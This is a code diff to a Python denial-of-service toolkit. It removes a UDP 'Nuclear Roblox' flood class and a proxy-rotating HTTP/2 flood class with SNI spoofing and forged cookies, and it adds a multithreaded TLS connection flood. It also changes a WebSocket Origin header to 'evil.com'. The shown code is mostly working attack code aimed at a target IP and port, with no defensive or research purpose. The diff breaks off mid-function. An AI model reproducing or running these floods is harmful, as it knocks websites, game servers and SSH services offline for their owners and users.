@@ -1,3 +1,4 @@
+import ssl
 import os
 import uuid
 import socket
@@ -11,6 +12,7 @@ import platform
 import threading
 import string
 from datetime import datetime
+from urllib.parse import urlparse
 
 # =========================
 # Configuration
@@ -579,7 +581,7 @@ class UniversalTCPBypass:
             f'Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}',
             'Sec-WebSocket-Version: 13',
             f'User-Agent: {random.choice(self.get_user_agents())}',
-            'Origin: http://example.com'
+            'Origin: http://evil.com'
         ]
         
         return '\r\n'.join(headers).encode() + b'\r\n\r\n'
@@ -1099,208 +1101,6 @@ class SSHKillerBypass:
             thread.join(timeout=5.0)
         
         print("[+] All SSH flood threads stopped")
-
-
-
-# =========================
-# Nuclear Roblox UDP Flood Attack Class
-# =========================
-class RobloxFlood:
-    def __init__(self, target_ip, port, duration):
-        self.target_ip = target_ip
-        self.port = port
-        self.duration = duration
-        self.num_threads = 1800
-        self.running = True
-        self.stop_event = threading.Event()  # Add stop event
-        self.packet_size = 1472
-        self.sent_packets = 0
-        self.attack_start = 0
-        self.sockets_per_thread = 15
-        self.batch_size = 500
-        self.packet_templates = self.pre_generate_templates()
-        self.peak_pps = 0
-        self.total_mb_sent = 0
-        self.threads = []  # Track threads
-    
-    def log(self, message):
-        """Simple log method for stop functionality"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        print(f"[{timestamp}] [HTTP] {message}")
-
-    def pre_generate_templates(self):
-        """Pre-generate 500 optimized templates"""
-        templates = []
-        for _ in range(500):
-            template = bytearray()
-            template.extend(b'\x07\x00')  # Roblox header
-            payload_size = random.randint(100, 1400)
-            template.extend(os.urandom(payload_size))
-            while len(template) < 200:
-                template.extend(os.urandom(100))
-            templates.append(bytes(template))
-        return templates
-
-    def create_ultra_socket(self):
-        """Create ultra-optimized UDP socket"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 100)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.setblocking(False)
-            try:
-                sock.bind(('0.0.0.0', random.randint(10000, 65535)))
-            except:
-                pass
-            return sock
-        except:
-            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    def generate_packet_burst(self, count=500):
-        """Generate ultra-fast packet burst"""
-        burst = []
-        for _ in range(count):
-            template = random.choice(self.packet_templates)
-            if len(template) > 10:
-                modified = bytearray(template)
-                modified[4] = random.randint(0, 255)
-                modified[5] = random.randint(0, 255)
-                burst.append(bytes(modified))
-            else:
-                burst.append(template)
-        return burst
-
-    def nuclear_flood_worker(self, worker_id):
-        """ULTRA optimized flood worker with immediate stop"""
-        sockets = [self.create_ultra_socket() for _ in range(self.sockets_per_thread)]
-        socket_index = 0
-        batches = [self.generate_packet_burst(self.batch_size) for _ in range(5)]
-        batch_index = 0
-        packets_sent = 0
-        start_time = time.time()
-        
-        while (self.running and 
-               not self.stop_event.is_set() and 
-               (time.time() - start_time < self.duration)):
-            
-            # Check stop condition
-            if self.stop_event.is_set() or not self.running:
-                break
-                
-            try:
-                packets = batches[batch_index]
-                batch_index = (batch_index + 1) % len(batches)
-                if batch_index == 0:
-                    batches = [self.generate_packet_burst(self.batch_size) for _ in range(5)]
-                
-                for packet in packets:
-                    # Check stop condition for each packet
-                    if self.stop_event.is_set() or not self.running:
-                        break
-                        
-                    sock = sockets[socket_index]
-                    socket_index = (socket_index + 1) % len(sockets)
-                    try:
-                        sock.sendto(packet, (self.target_ip, self.port))
-                        packets_sent += 1
-                        self.sent_packets += 1
-                    except (BlockingIOError, OSError):
-                        continue
-                    except Exception:
-                        try:
-                            sock.close()
-                        except:
-                            pass
-                        sockets[socket_index] = self.create_ultra_socket()
-            except Exception:
-                pass
-        
-        for sock in sockets:
-            try:
-                sock.close()
-            except:
-                pass
-
-    def start_nuclear_attack(self):
-        """Start the nuclear attack with thread tracking"""
-        print(f"[💀] STARTING NUCLEAR ROBLOX FLOOD - IMMEDIATE STOP")
-        
-        self.attack_start = time.time()
-        
-        # Track threads
-        self.threads = []
-        for i in range(self.num_threads):
-            thread = threading.Thread(target=self.nuclear_flood_worker, args=(i,))
-            thread.daemon = True
-            self.threads.append(thread)
-        
-        # Rapid-fire thread startup
-        batch_size = 300
-        for i in range(0, len(self.threads), batch_size):
-            batch = self.threads[i:i + batch_size]
-            for thread in batch:
-                thread.start()
-            time.sleep(0.01)
-        
-        # Monitoring with stop check
-        last_count = 0
-        last_time = time.time()
-        
-        try:
-            while (time.time() - self.attack_start < self.duration and 
-                   self.running and 
-                   not self.stop_event.is_set()):
-                
-                current_time = time.time()
-                elapsed = current_time - self.attack_start
-                remaining = self.duration - elapsed
-                
-                current_count = self.sent_packets
-                time_diff = current_time - last_time
-                
-                if time_diff > 0:
-                    pps = int((current_count - last_count) / time_diff)
-                    self.peak_pps = max(self.peak_pps, pps)
-                    mbps = (pps * self.packet_size) / (1024 * 1024)
-                    self.total_mb_sent = (current_count * self.packet_size) / (1024 * 1024)
-                    
-                    stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
-                    print(f"\r[🔥] Time: {int(elapsed)}s | PPS: {pps:,}/s | BW: {mbps:.1f} MB/s | Total: {current_count:,} packets{stop_status}", 
-                          end="", flush=True)
-                
-                last_count = current_count
-                last_time = current_time
-                time.sleep(0.2)
-                
-        except KeyboardInterrupt:
-            print(f"\n[🛑] EMERGENCY STOP!")
-        finally:
-            self.stop()
-            
-            total_duration = time.time() - self.attack_start
-            if total_duration > 0:
-                avg_pps = self.sent_packets / total_duration
-                print(f"\n[✅] ATTACK COMPLETE")
-                print(f"[📊] Final Stats:")
-                print(f"    Total Packets: {self.sent_packets:,}")
-                print(f"    Peak PPS: {self.peak_pps:,}/s")
-                print(f"    Average PPS: {avg_pps:,.0f}/s")
-                print(f"    Total Data: {self.total_mb_sent/1024:.2f} GB")
-            else:
-                print(f"\n[✅] ATTACK STOPPED IMMEDIATELY")
-
-    def stop(self):
-        """Immediate stop method for Roblox flood"""
-        self.running = False
-        self.stop_event.set()
-        print("[+] Roblox Flood STOP command received")
-        
-        # Wait for threads to terminate
-        for thread in self.threads:
-            thread.join(timeout=5.0)
-        
-        print("[+] All Roblox flood threads stopped")
 
 
 
@@ -1950,528 +1750,149 @@ class HTTPBypassFlood:
         self.log(f"All threads stopped. Final stats: {self.successful_requests} successful requests")
 
 
+# =========================
+# TLS Flood Attack Class (from tls.py)
+# =========================
+class HumanBytes:
+    METRIC_LABELS = ["B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB","RB","QB"]
+    BINARY_LABELS = ["B", "KiB", "MiB", "GiB", "TiB", "PiB", "EiB", "ZiB", "YiB"]
+    PRECISION_OFFSETS = [0.5, 0.05, 0.005, 0.0005, 0.00005]
+    PRECISION_FORMATS = ["{}{:.0f} {}", "{}{:.1f} {}", "{}{:.2f} {}", "{}{:.3f} {}", "{}{:.4f} {}", "{}{:.5f} {}"]
+    
+    @staticmethod
+    def format(num, metric=False, precision=1):
+        assert isinstance(num, (int, float))
+        assert isinstance(metric, bool)
+        assert isinstance(precision, int) and precision >= 0 and precision <= 3
+        unit_labels = HumanBytes.METRIC_LABELS if metric else HumanBytes.BINARY_LABELS
+        last_label = unit_labels[-1]
+        unit_step = 1000 if metric else 1024
+        unit_step_thresh = unit_step - HumanBytes.PRECISION_OFFSETS[precision]
+        is_negative = num < 0
+        if is_negative:
+            num = abs(num)
+        for unit in unit_labels:
+            if num < unit_step_thresh:
+                break
+            if unit != last_label:
+                num /= unit_step
+        return HumanBytes.PRECISION_FORMATS[precision].format("-" if is_negative else "", num, unit)
 
-# =========================
-# Enhanced HTTP/2 Flood Attack Class with Realistic Headers & In-Memory Proxies
-# =========================
-class HTTP2RushFlood:
-    def __init__(self, target_ip, port, duration, method="GET", path="/", ssl=True, proxy_sources=None):
+class TLSFloodAttack:
+    def __init__(self, target_ip, port, duration, method="GET"):
         self.target_ip = target_ip
         self.port = port
         self.duration = duration
         self.method = method.upper()
-        self.path = path
-        self.ssl = ssl
-        self.num_threads = 2000
         self.running = True
         self.stop_event = threading.Event()
-        self.connection_count = 0
-        self.successful_requests = 0
-        self.failed_requests = 0
-        self.goaway_count = 0
-        self.proxy_list = []
-        self.proxy_index = 0
-        self.proxy_lock = threading.Lock()
-        self.proxy_stats = {"working": 0, "dead": 0, "total": 0}
-        
-        # Proxy sources
-        self.proxy_sources = proxy_sources or [
-            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
-            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
-            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
-            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
-            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
-            'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
-            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
-            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
-            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
-            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
-            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
-            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
-            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-            'http://worm.rip/http.txt',
-            'https://proxyspace.pro/http.txt',
-            'https://proxy-spider.com/api/proxies.example.txt',
-            'http://193.200.78.26:8000/http?key=free'
-        ]
-        
-        # HTTP/2 specific settings
-        self.custom_table = 65535
-        self.custom_window = 6291456
-        self.custom_header = 262144
-        self.custom_update = 15663105
-        
-        # Enhanced header components
-        self.cookie_templates = [
-            "_ga_YNWG1736LP=GS2.1.{timestamp}$o2$g1$t{timestamp}$j59$l0$h0",
-            "cf_clearance={random_hash}-{timestamp}-1.2.1.1-{random_string}",
-            "_ga=GA1.1.{random_number}.{timestamp}",
-            "__cf_bm={random_hash}-{timestamp}-1.0.1.1-{random_string}",
-            "session_{random_id}={random_hash}",
-            "user_token={random_hash}",
-            "auth_{random_id}={random_string}"
-        ]
-        
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"
-        ]
-        
-        self.accept_languages = [
-            "en-US,en;q=0.9",
-            "en-US,en;q=0.8",
-            "en-GB,en;q=0.9",
-            "en-CA,en;q=0.9",
-            "en-AU,en;q=0.9"
-        ]
-        
-        self.accept_encodings = [
-            "gzip, deflate, br",
-            "gzip, deflate",
-            "br, gzip, deflate"
-        ]
-        
-        self.referers = [
-            "https://www.google.com/",
-            "https://www.bing.com/",
-            "https://www.facebook.com/",
-            "https://twitter.com/",
-            "https://www.reddit.com/",
-            "https://www.youtube.com/",
-            "https://www.linkedin.com/",
-            f"https://{self.target_ip}/",
-            f"https://{self.target_ip}/home",
-            f"https://{self.target_ip}/index.html"
-        ]
-
-    def log(self, message):
-        """Log messages for HTTP/2 flood"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        print(f"[{timestamp}] [HTTP2] {message}")
-
-    def generate_random_hash(self, length=32):
-        """Generate random hash string"""
-        return hashlib.md5(os.urandom(32)).hexdigest()[:length]
-
-    def generate_random_string(self, length=16):
-        """Generate random alphanumeric string"""
-        chars = string.ascii_letters + string.digits
-        return ''.join(random.choice(chars) for _ in range(length))
-
-    def generate_random_cookie(self):
-        """Generate realistic random cookies"""
-        timestamp = str(int(time.time()))
-        random_number = random.randint(1000000000, 9999999999)
-        
-        template = random.choice(self.cookie_templates)
-        cookie = template.format(
-            timestamp=timestamp,
-            random_hash=self.generate_random_hash(),
-            random_string=self.generate_random_string(20),
-            random_number=random_number,
-            random_id=random.randint(1000, 9999)
-        )
-        
-        return cookie
-
-    def generate_cookie_header(self):
-        """Generate complete Cookie header with multiple cookies"""
-        num_cookies = random.randint(2, 4)
-        cookies = [self.generate_random_cookie() for _ in range(num_cookies)]
-        return "; ".join(cookies)
-
-    def generate_realistic_headers(self, stream_id):
-        """Generate realistic HTTP/2 headers like the example"""
-        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
-        method = random.choice(methods)
-        
-        headers = [
-            (':method', method),
-            (':authority', self.target_ip),
-            (':scheme', 'https'),
-            (':path', self.path),
-            ('cookie', self.generate_cookie_header()),
-            ('user-agent', random.choice(self.user_agents)),
-            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
-            ('accept-language', random.choice(self.accept_languages)),
-            ('accept-encoding', random.choice(self.accept_encodings)),
-            ('referer', random.choice(self.referers)),
-            ('upgrade-insecure-requests', '1'),
-            ('sec-fetch-dest', 'document'),
-            ('sec-fetch-mode', 'navigate'),
-            ('sec-fetch-site', random.choice(['same-origin', 'cross-site', 'none'])),
-            ('sec-fetch-user', '?1'),
-            ('priority', random.choice(['u=0, i', 'u=1, i', 'u=0,1', 'u=1'])),
-            ('te', 'trailers')
-        ]
-        
-        # Add some optional headers randomly
-        if random.random() > 0.5:
-            headers.append(('cache-control', random.choice(['no-cache', 'max-age=0', 'no-store'])))
-        
-        if random.random() > 0.7:
-            headers.append(('dnt', random.choice(['1', '0'])))
-        
-        # Shuffle headers for more realism
-        random.shuffle(headers)
-        
-        return headers
-
-    async def scrape_proxies_async(self):
-        """Asynchronously scrape proxies from all sources (memory only)"""
-        import aiohttp
-        import asyncio
-        
-        self.log("Starting proxy scraping (in-memory)...")
-        all_proxies = set()
-        
-        async def fetch_proxies(session, url):
-            try:
-                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    if response.status == 200:
-                        text = await response.text()
-                        proxies = set()
-                        for line in text.split('\n'):
-                            line = line.strip()
-                            if line and ':' in line and not line.startswith('#'):
-                                parts = line.split(':')
-                                if len(parts) >= 2:
-                                    ip = parts[0]
-                                    port = parts[1]
-                                    if self.is_valid_ip(ip) and port.isdigit():
-                                        proxies.add(f"{ip}:{port}")
-                        return proxies
-            except Exception as e:
-                self.log(f"Failed to scrape {url}: {e}")
-            return set()
-        
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for source in self.proxy_sources:
-                tasks.append(fetch_proxies(session, source))
-            
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            for result in results:
-                if isinstance(result, set):
-                    all_proxies.update(result)
-        
-        self.proxy_list = list(all_proxies)
-        self.proxy_stats["total"] = len(self.proxy_list)
-        self.log(f"Scraped {len(self.proxy_list)} proxies (in memory) from {len(self.proxy_sources)} sources")
-        return self.proxy_list
-
-    def scrape_proxies_sync(self):
-        """Synchronous proxy scraping (memory only)"""
-        import requests
-        
-        self.log("Starting proxy scraping (sync, in-memory)...")
-        all_proxies = set()
-        
-        for source in self.proxy_sources:
-            try:
-                response = requests.get(source, timeout=10)
-                if response.status_code == 200:
-                    for line in response.text.split('\n'):
-                        line = line.strip()
-                        if line and ':' in line and not line.startswith('#'):
-                            parts = line.split(':')
-                            if len(parts) >= 2:
-                                ip = parts[0]
-                                port = parts[1]
-                                if self.is_valid_ip(ip) and port.isdigit():
-                                    all_proxies.add(f"{ip}:{port}")
-                self.log(f"Scraped from {source}: {len(all_proxies)} proxies so far")
-            except Exception as e:
-                self.log(f"Failed to scrape {source}: {e}")
-        
-        self.proxy_list = list(all_proxies)
-        self.proxy_stats["total"] = len(self.proxy_list)
-        self.log(f"Total scraped proxies (in memory): {len(self.proxy_list)}")
-        return self.proxy_list
-
-    def is_valid_ip(self, ip):
-        """Validate IP address format"""
-        try:
-            socket.inet_pton(socket.AF_INET, ip)
-            return True
-        except socket.error:
-            try:
-                socket.inet_pton(socket.AF_INET6, ip)
-                return True
-            except socket.error:
-                return False
-
-    def get_next_proxy(self):
-        """Get next proxy with round-robin rotation"""
-        with self.proxy_lock:
-            if not self.proxy_list:
-                return None
-            proxy = self.proxy_list[self.proxy_index]
-            self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
-            return proxy
-
-    def create_proxied_http2_socket(self, proxy):
-        """Create HTTP/2 socket through proxy"""
-        try:
-            import ssl
-            
-            proxy_host, proxy_port = proxy.split(':')
-            proxy_port = int(proxy_port)
-            
-            # Connect to proxy first
-            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
-            proxy_sock.settimeout(10)
-            
-            proxy_sock.connect((proxy_host, proxy_port))
-            
-            # Send CONNECT request to proxy
-            connect_request = f"CONNECT {self.target_ip}:{self.port} HTTP/1.1\r\nHost: {self.target_ip}:{self.port}\r\nProxy-Connection: Keep-Alive\r\n\r\n"
-            proxy_sock.send(connect_request.encode())
-            
-            # Read proxy response
-            response = b""
-            while b"\r\n\r\n" not in response:
-                chunk = proxy_sock.recv(4096)
-                if not chunk:
-                    raise Exception("Proxy connection failed")
-                response += chunk
-            
-            if b"200" not in response:
-                raise Exception(f"Proxy rejected connection: {response[:200]}")
-            
-            # Now wrap with TLS for HTTP/2
-            if self.ssl:
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                context.options |= ssl.OP_NO_SSLv2
-                context.options |= ssl.OP_NO_SSLv3
-                context.options |= ssl.OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
-                context.set_ciphers('TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384')
-                context.set_alpn_protocols(['h2', 'http/1.1'])
-                
-                # SNI spoofing
-                sni_hosts = [self.target_ip, 'www.google.com', 'www.cloudflare.com', 'www.facebook.com']
-                sni_hostname = random.choice(sni_hosts)
-                
-                ssl_sock = context.wrap_socket(
-                    proxy_sock,
-                    server_hostname=sni_hostname,
-                    do_handshake_on_connect=True
-                )
-                
-                return ssl_sock
-            
-            return proxy_sock
-            
-        except Exception as e:
-            self.log(f"Proxy connection failed ({proxy}): {e}")
-            return None
-
-    def send_http2_preface(self, sock):
-        """Send HTTP/2 connection preface"""
-        try:
-            preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
-            sock.send(preface)
-            return True
-        except:
-            return False
-
-    def encode_frame(self, stream_id, frame_type, payload=b'', flags=0):
-        """Encode HTTP/2 frame"""
-        frame = bytearray(9)
-        length = len(payload)
-        frame[0:3] = length.to_bytes(3, 'big')
-        frame[3] = frame_type
-        frame[4] = flags
-        frame[5:9] = stream_id.to_bytes(4, 'big')
-        frame.extend(payload)
-        return bytes(frame)
-
-    def send_http2_settings(self, sock):
-        """Send HTTP/2 settings frame"""
-        try:
-            settings = [
-                (0x1, self.custom_header),   # HEADER_TABLE_SIZE
-                (0x2, 0),                   # ENABLE_PUSH
-                (0x3, self.custom_window),  # MAX_CONCURRENT_STREAMS
-                (0x4, self.custom_window),  # INITIAL_WINDOW_SIZE
-                (0x5, self.custom_table),   # MAX_FRAME_SIZE
-            ]
-            
-            payload = b''
-            for setting in settings:
-                payload += setting[0].to_bytes(2, 'big') + setting[1].to_bytes(4, 'big')
-            
-            settings_frame = self.encode_frame(0, 0x4, payload)
-            sock.send(settings_frame)
-            
-            # Send WINDOW_UPDATE frame
-            window_update = self.custom_update.to_bytes(4, 'big')
-            window_frame = self.encode_frame(0, 0x8, window_update)
-            sock.send(window_frame)
-            
-            return True
-        except:
-            return False
-
-    def create_http2_headers_frame(self, stream_id):
-        """Create HTTP/2 headers frame with realistic headers"""
-        headers = self.generate_realistic_headers(stream_id)
-        
-        # Simple header encoding (simplified)
-        header_block = b''
-        for name, value in headers:
-            header_block += len(name).to_bytes(1, 'big') + name.encode()
-            header_block += len(value).to_bytes(1, 'big') + value.encode()
-        
-        flags = 0x4 | 0x1  # END_HEADERS | END_STREAM
-        headers_frame = self.encode_frame(stream_id, 0x1, header_block, flags)
-        
-        return headers_frame
-
-    def http2_flood_worker(self, worker_id):
-        """HTTP/2 flood worker with proxy rotation and realistic headers"""
-        try:
-            start_time = time.time()
-            rate_per_second = random.randint(50, 100)  # Dynamic rate
-            
-            while (self.running and 
-                   not self.stop_event.is_set() and 
-                   time.time() - start_time < self.duration):
-                
-                proxy = self.get_next_proxy()
-                if not proxy:
-                    self.log(f"Worker {worker_id}: No proxies available")
-                    time.sleep(1)
-                    continue
-                
-                try:
-                    # Create proxied connection
-                    sock = self.create_proxied_http2_socket(proxy)
-                    if not sock:
-                        self.failed_requests += 1
-                        continue
-                    
-                    self.connection_count += 1
-                    
-                    # Perform HTTP/2 handshake
-                    if not self.send_http2_preface(sock):
-                        sock.close()
-                        continue
-                    
-                    if not self.send_http2_settings(sock):
-                        sock.close()
-                        continue
-                    
-                    # Send multiple streams with realistic headers
-                    stream_id = 1
-                    requests_in_connection = random.randint(10, 30)
-                    
-                    for _ in range(requests_in_connection):
-                        if self.stop_event.is_set() or not self.running:
-                            break
-                        
-                        try:
-                            headers_frame = self.create_http2_headers_frame(stream_id)
-                            sock.send(headers_frame)
-                            
-                            self.successful_requests += 1
-                            stream_id += 2
-                            
-                            time.sleep(1.0 / rate_per_second)
-                            
-                        except (BrokenPipeError, ConnectionResetError, socket.timeout):
-                            self.failed_requests += 1
-                            break
-                    
-                    sock.close()
-                    
-                except (socket.timeout, ConnectionRefusedError, ConnectionResetError) as e:
-                    self.failed_requests += 1
-                    time.sleep(0.1)
-                except Exception as e:
-                    self.failed_requests += 1
-                    time.sleep(0.1)
-                    
-        except Exception as e:
-            self.log(f"Worker {worker_id} error: {e}")
-
-    def scrape_and_start(self):
-        """Scrape proxies to memory and start attack"""
-        self.log("Starting in-memory proxy scraping phase...")
-        
-        # Try async scraping first, fallback to sync
-        try:
-            import asyncio
-            asyncio.run(self.scrape_proxies_async())
-        except:
-            self.scrape_proxies_sync()
-        
-        if not self.proxy_list:
-            self.log("No proxies found! Starting direct attack...")
-            # Fallback to direct connection
-            self.proxy_list = [None]
-        else:
-            self.log(f"Successfully loaded {len(self.proxy_list)} proxies in memory")
-            
-            # Quick proxy test
-            self.log("Quick proxy connectivity check...")
-            working_count = 0
-            test_proxies = random.sample(self.proxy_list, min(5, len(self.proxy_list)))
-            for proxy in test_proxies:
-                try:
-                    proxy_host, proxy_port = proxy.split(':')
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(3)
-                    sock.connect((proxy_host, int(proxy_port)))
-                    sock.close()
-                    working_count += 1
-                except:
-                    pass
-            
-            self.log(f"Proxy quick test: {working_count}/{len(test_proxies)} responsive")
-        
-        # Start the actual attack
-        self.start_attack()
-
-    def start_attack(self):
-        """Start the actual HTTP/2 flood attack"""
-        print(f"[🚀] STARTING HTTP/2 RUSH FLOOD ATTACK")
-        print(f"[🎯] Target: {self.target_ip}:{self.port}")
-        print(f"[⏱️] Duration: {self.duration}s")
-        print(f"[👥] Threads: {self.num_threads}")
-        print(f"[🔌] Proxies: {len(self.proxy_list)} in memory")
-        print(f"[⚡] Protocol: HTTP/2 with Realistic Headers")
-        print(f"[🔧] Features:")
-        print("    ✓ Realistic Browser Headers")
-        print("    ✓ Random Cookies & User-Agents")
-        print("    ✓ Proxy Rotation (Memory Only)")
-        print("    ✓ HTTP/2 Multiplexing")
-        print("    ✓ TLS 1.3 Optimization")
-        print("    ✓ Mixed HTTP Methods")
-        print("    ✓ Auto Proxy Scraping")
-
+        self.packets_sent = 0
         self.threads = []
-        for i in range(self.num_threads):
+        
+    def log(self, message):
+        """Log messages for TLS flood"""
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        print(f"[{timestamp}] [TLS] {message}")
+
+    def get_target(self, url2):
+        """Parse target URL"""
+        url = url2.rstrip()
+        target = {}
+        parsed_url = urlparse(url)
+        target['uri'] = parsed_url.path or '/'
+        target['host'] = parsed_url.netloc
+        target['scheme'] = parsed_url.scheme
+        target['port'] = parsed_url.port or ("443" if target['scheme'] == "https" else "80")
+        target['normal'] = url2
+        return target
+
+    def generate_url_path(self, num):
+        """Generate random URL path"""
+        data = "".join(random.sample(string.printable, int(num)))
+        return data
+
+    def gen_id(self):
+        """Generate random ID"""
+        letter = 'abcdefghijklmnopqrstuvwxyz0123456789'
+        id_8 = ''.join(random.choice(letter) for _ in range(8))
+        id_4v1 = ''.join(random.choice(letter) for _ in range(4))
+        id_4v2 = ''.join(random.choice(letter) for _ in range(4))
+        id_4v3 = ''.join(random.choice(letter) for _ in range(4))
+        id_12 = ''.join(random.choice(letter) for _ in range(12))
+        return f'{id_8}-{id_4v1}-{id_4v2}-{id_4v3}-{id_12}'
+
+    def tls_flood_worker(self, worker_id):
+        """TLS flood worker thread"""
+        target = {
+            'host': self.target_ip,
+            'port': self.port,
+            'uri': '/'
+        }
+        
+        start_time = time.time()
+        
+        while (self.running and 
+               not self.stop_event.is_set() and 
+               time.time() - start_time < self.duration):
+            
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect((str(target['host']), int(target['port'])))
+                
+                # Create SSL context with multiple protocol options
+                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ssl_context.check_hostname = False
+                ssl_context.verify_mode = ssl.CERT_NONE
+                
+                ssl_socket = ssl_context.wrap_socket(s, server_hostname=target['host'])
+                
+                url_path = self.generate_url_path(random.randint(5, 20))
+                
+                # Generate HTTP request with TLS
+                byt = f"{self.method} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
+                
+                # Send multiple requests per connection
+                for _ in range(random.randint(10, 50)):
+                    if self.stop_event.is_set() or not self.running:
+                        break
+                    
+                    try:
+                        ssl_socket.write(byt)
+                        ssl_socket.sendall(byt)
+                        self.packets_sent += 1
+                    except:
+                        break
+                
+                ssl_socket.close()
+                
+            except Exception as e:
+                pass
+            finally:
+                time.sleep(random.uniform(0.01, 0.1))
+
+    def start(self):
+        """Start TLS flood attack"""
+        print(f"[+] Starting TLS Flood Attack")
+        print(f"[+] Target: {self.target_ip}:{self.port}")
+        print(f"[+] Duration: {self.duration}s")
+        print(f"[+] Method: {self.method}")
+        print(f"[+] Protocol: TLS/SSL")
+        print("[+] Attack Type: Encrypted connection flood")
+        
+        num_threads = 500  # Adjust based on system capabilities
+        
+        self.threads = []
+        for i in range(num_threads):
             if self.stop_event.is_set() or not self.running:
                 break
-            thread = threading.Thread(target=self.http2_flood_worker, args=(i,), daemon=True)
+            thread = threading.Thread(target=self.tls_flood_worker, args=(i,), daemon=True)
             self.threads.append(thread)
             thread.start()
-
+        
         try:
             start_time = time.time()
-            last_requests = 0
+            last_count = 0
             
             while (time.time() - start_time < self.duration and 
                    self.running and 
@@ -2480,56 +1901,40 @@ class HTTP2RushFlood:
                 elapsed = int(time.time() - start_time)
                 remaining = self.duration - elapsed
                 
-                current_requests = self.successful_requests
-                rps = current_requests - last_requests
-                last_requests = current_requests
+                current_count = self.packets_sent
+                pps = current_count - last_count
+                last_count = current_count
                 
-                proxy_info = f" | Proxies: {len(self.proxy_list)}" if self.proxy_list and self.proxy_list[0] is not None else " | Direct"
                 stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
-                
-                print(f"\r[🔥] Time: {elapsed}s | RPS: {rps}/s | Total: {current_requests:,} | Conns: {self.connection_count}{proxy_info}{stop_status}", 
+                print(f"\r[+] Time: {elapsed}s | Packets: {current_count} | PPS: {pps}/s{stop_status}", 
                       end="", flush=True)
-                
                 time.sleep(1)
                 
         except KeyboardInterrupt:
-            print(f"\n[🛑] EMERGENCY STOP!")
+            print("\n[+] Stopping TLS attack...")
         finally:
             self.stop()
             
             total_time = time.time() - start_time
             if total_time > 0:
-                avg_rps = self.successful_requests / total_time
